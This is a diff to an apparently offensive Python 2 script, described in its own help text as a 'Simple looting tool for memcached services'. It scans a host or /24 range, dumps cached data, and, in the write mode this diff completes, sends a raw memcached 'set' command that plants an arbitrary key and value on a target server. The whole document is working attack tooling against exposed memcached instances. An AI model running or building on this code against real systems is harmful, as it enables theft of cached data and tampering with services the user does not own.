@@ -11,24 +11,20 @@ mode_loot = "loot"
 mode_write = "write"
 LOOTMODE = [mode_info, mode_loot, mode_write]
 
-WRITE_CHECKER = ("VERYTEST","VERY_TEST_VALUE")
-
 def cmd():
 	parser = argparse.ArgumentParser(description='Simple looting tool for memcached services')	
 	parser.add_argument('-t','--target', required=True, help='Specify target. It can be single host, or range of hosts, separated by hyphen. For now, only /24 net will scan n')
 	parser.add_argument('-p','--port', default ="11211", help='Specify target port. By default 11211 is used\n')
 	parser.add_argument('-m','--mode', default = mode_info, choices=LOOTMODE, help='Specify working mode. By default it tries to read all the possible data')
 	parser.add_argument('-k','--key', default = None, help='Key to write data to')
-	parser.add_argument('-v','--value', default = None, help='Data to write to specified key')
+	parser.add_argument('-v','--value', default = None, help='Data to write for specified key')
 	parser.add_argument('-o','--output', help='File to write the output')
 
 	args= parser.parse_args()
-	mode = args.mode
+
 	#Parse & Check target host
 	target = args.target
 	port = args.port
-	key = args.key
-	value = args.value
 	try:
 		int(port[1])
 	except ValueError:
@@ -38,7 +34,6 @@ def cmd():
 		print "[-]Incorrect port number: %s"%(port)
 		sys.exit(-1)
 	#Maybe to perform some additional checks here
-	output = args.output
 
 	# Create adequate check for IP addresses
 	if 1 == 1:
@@ -60,6 +55,22 @@ def cmd():
 					print "[-]Incorrect ip address: %s"%(ip)
 					sys.exit(-1)
 				ipList.append(ip)
+
+	mode = args.mode
+
+	key, value = None, None
+	if (mode == mode_write):
+		key = args.key
+		value = args.value
+		if (key == None) or (value == None):
+			print "[-] Key and Value to write must be specified"
+			sys.exit(-1)
+		if (len(ipList) > 1):
+			print "[-]Write command could only be performed to a single host"
+			sys.exit(-1)
+
+	output = args.output
+
 	print "[!] Working mode: %s" % (mode)
 	print "[!] Target host(s): %s" % (target)
 	print "[!] Target port: %s" % (port)
@@ -86,7 +97,7 @@ def parse_stat(resp):
 
 
 if __name__ == "__main__":
-	ipList,port,mode,output = cmd()
+	ipList, port, mode, key_to_write, value_to_write, output = cmd()
 	toFile = False
 	if output != None:
 		toFile = True
@@ -142,10 +153,19 @@ if __name__ == "__main__":
 			if toFile: f.close()
 
 	if mode == mode_write:
-		for ip in ipList:
+			socket.setdefaulttimeout(3)
 			s = socket.socket()
-			s.connect((ip,port))
-			s.send("add test 0 900000 2\r\n10\r\n")	
-			print s.recv(1024)	
-			print "[!?] Write actions to be write here"
-
+			s.connect((ipList[0],port))
+			#Set key:value to store for 900000ms (some random int =)) 
+			mc_cmd = "set %s 0 900000 %d\r\n%s\r\n" % (key_to_write, len(value_to_write), value_to_write)
+			print mc_cmd
+			try:
+				s.send(mc_cmd)	
+				resp = s.recv(1024)
+				print "[+] %s" % resp
+			except socket.timeout:
+				print "[-] Timeout occured"
+				sys.exit(-1)
+			except socket.error,e:
+				print e
+				sys.exit(-1)
